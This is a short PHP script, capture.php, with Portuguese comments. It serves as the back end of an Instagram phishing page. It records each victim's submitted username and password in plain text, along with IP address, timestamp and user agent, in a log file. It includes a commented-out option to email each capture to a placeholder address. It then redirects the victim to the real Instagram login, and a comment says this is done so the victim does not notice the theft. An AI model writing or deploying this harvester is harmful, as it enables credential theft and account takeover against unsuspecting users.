<?php
// capture.php

// 1. Verificar se os dados foram enviados
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // 2. Formatar o log
    $log_entry = "[$timestamp] | IP: $ip\nUSUARIO: $username\nSENHA: $password\nUSER-AGENT: $user_agent\n" . str_repeat("-", 50) . "\n";

    // 3. Salvar o log em um arquivo
    $log_dir = __DIR__ . '/logs/';
    if (!is_dir($log_dir)) {
        mkdir($log_dir, 0777, true);
    }
    
    $log_file = $log_dir . 'captures.txt';
    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

    // 4. (Opcional) Enviar por e-mail (requer configuração de mail)
    // mail('seu_email@gmail.com', 'Nova Captura: ' . $username, $log_entry);

    // 5. Redirecionar para o Instagram real
    // Isso faz a vítima acreditar que o login funcionou ou que ela só está na página real
    header('Location: https://www.instagram.com/accounts/login/');
    exit();
} else {
    // Se os dados não forem enviados, redirecionar para a página de login
    header('Location: index.html');
    exit();
}
?>
